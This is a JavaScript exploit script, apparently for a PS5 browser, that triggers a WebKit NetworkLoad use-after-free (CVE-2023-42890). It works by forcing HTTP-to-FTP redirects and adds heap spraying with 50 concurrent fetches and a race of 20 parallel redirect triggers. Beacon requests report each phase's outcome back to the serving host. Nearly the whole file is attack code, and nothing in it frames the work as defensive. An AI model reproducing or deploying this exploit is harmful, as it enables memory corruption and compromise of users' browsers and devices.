// p170 — CVE-2023-42890 UAF trigger
//
// NetworkLoad::willPerformHTTPRedirection UAF
// When HTTP 302 redirects to ftp:// and FTP is disabled:
//   1. didCompleteWithError() notifies client
//   2. Client calls cleanup() which sets m_networkLoad = nullptr (destroying this)
//   3. Back in willPerformHTTPRedirection, completionHandler on freed memory
//
// Trigger: fetch a URL that returns 302 Location: ftp://x
// The server endpoint /ftp-redir must return that redirect.
//
// For heap grooming: spray NetworkLoad-sized objects before and after
// the trigger to control what lands in the freed slot.
//
// Beacon prefix: V170-

(function() {
  var BASE = location.protocol + '//' + location.host;
  var queue = [];
  var sending = false;

  function B(tag) {
    queue.push(tag);
    if (!sending) drain();
  }

  function drain() {
    if (queue.length === 0) { sending = false; return; }
    sending = true;
    var tag = queue.shift();
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V170-' + tag + '?t=' + Date.now(), true);
      x.onloadend = function() { setTimeout(drain, 15); };
      x.onerror = function() { setTimeout(drain, 15); };
      x.send();
    } catch(e) { setTimeout(drain, 15); }
  }

  function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  // ── PHASE 1: CONFIRM THE BUG EXISTS ──
  // Single fetch to /ftp-redir. If the NetworkProcess crashes or
  // we get a specific error, the UAF fired.
  // If we get a normal network error, FTP redirect was handled safely (patched).

  B('PHASE1-SINGLE');

  // First, a baseline fetch to confirm networking works
  fetch(BASE + '/beacon/V170-FETCH-OK?t=' + Date.now())
    .then(function() {
      B('NET-OK');
      triggerUAF();
    })
    .catch(function(e) {
      B('NET-ERR-' + (e.message || '').substring(0, 30));
      // Try XHR instead
      triggerUAFxhr();
    });

  function triggerUAF() {
    B('TRIGGER-FETCH');

    // The server must respond to /ftp-redir with:
    //   HTTP/1.1 302 Found
    //   Location: ftp://evil.test/pwn
    //
    // This triggers willPerformHTTPRedirection with an FTP URL

    fetch(BASE + '/ftp-redir', { redirect: 'follow' })
      .then(function(resp) {
        B('RESP-' + resp.status + '-' + resp.type);
        return resp.text();
      })
      .then(function(body) {
        B('BODY-' + body.substring(0, 50));
      })
      .catch(function(e) {
        // Expected: either TypeError (network error from crash)
        // or AbortError if the NetworkProcess died
        B('CATCH-' + e.constructor.name + '-' + (e.message || '').substring(0, 40));
      });

    // Also try with XHR (different code path)
    setTimeout(function() {
      triggerUAFxhr();
    }, 500);
  }

  function triggerUAFxhr() {
    B('TRIGGER-XHR');
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/ftp-redir', true);
      x.onload = function() {
        B('XHR-OK-' + x.status);
      };
      x.onerror = function() {
        B('XHR-ERR');
      };
      x.ontimeout = function() {
        B('XHR-TIMEOUT');
      };
      x.timeout = 5000;
      x.send();
    } catch(e) {
      B('XHR-EX-' + (e.message || '').substring(0, 30));
    }

    // After both attempts, check if networking still works
    setTimeout(checkAlive, 3000);
  }

  function checkAlive() {
    B('CHECK-ALIVE');
    fetch(BASE + '/beacon/V170-ALIVE-CHECK?t=' + Date.now())
      .then(function() {
        B('STILL-ALIVE');
        // NetworkProcess didn't crash. Either:
        // 1. FTP is actually enabled (unlikely on PS5)
        // 2. The UAF doesn't crash immediately (we need heap grooming)
        // 3. The bug is somehow patched

        // Try phase 2: spray + trigger
        phase2Spray();
      })
      .catch(function() {
        B('NET-DEAD');
        // NetworkProcess crashed! The UAF fired.
        // This is the confirmation we need.
      });
  }

  // ── PHASE 2: SPRAY + TRIGGER ──
  // If phase 1 didn't crash, the freed memory got lucky and
  // completionHandler was still intact. Spray to control what
  // replaces the NetworkLoad object.
  function phase2Spray() {
    B('PHASE2-SPRAY');

    // Spray: open many fetch connections to fill allocator pages
    // with controlled data. Each inflight fetch creates a NetworkLoad.
    var sprays = [];
    for (var i = 0; i < 50; i++) {
      sprays.push(
        fetch(BASE + '/slow-response?id=' + i + '&t=' + Date.now())
          .catch(function() {})
      );
    }

    // After sprays are inflight, trigger the UAF
    // The freed NetworkLoad slot should be filled by one of the spray loads
    setTimeout(function() {
      B('SPRAY-TRIGGER');
      fetch(BASE + '/ftp-redir', { redirect: 'follow' })
        .then(function(r) { B('S2-OK-' + r.status); })
        .catch(function(e) { B('S2-ERR-' + (e.message || '').substring(0, 30)); });

      setTimeout(function() {
        B('PHASE2-CHECK');
        fetch(BASE + '/beacon/V170-P2-ALIVE?t=' + Date.now())
          .then(function() { B('P2-ALIVE'); phase3Multi(); })
          .catch(function() { B('P2-DEAD'); });
      }, 2000);
    }, 500);
  }

  // ── PHASE 3: MULTI-TRIGGER ──
  // Race multiple FTP redirects simultaneously
  function phase3Multi() {
    B('PHASE3-MULTI');
    var promises = [];
    for (var i = 0; i < 20; i++) {
      promises.push(
        fetch(BASE + '/ftp-redir?n=' + i, { redirect: 'follow' })
          .then(function(r) { return 'ok-' + r.status; })
          .catch(function(e) { return 'err-' + (e.message || '').substring(0, 20); })
      );
    }
    Promise.all(promises).then(function(results) {
      var summary = results.join(',').substring(0, 200);
      B('P3-' + summary);

      setTimeout(function() {
        fetch(BASE + '/beacon/V170-P3-ALIVE?t=' + Date.now())
          .then(function() { B('P3-ALIVE'); })
          .catch(function() { B('P3-DEAD'); });
      }, 1000);
    });
  }
})();
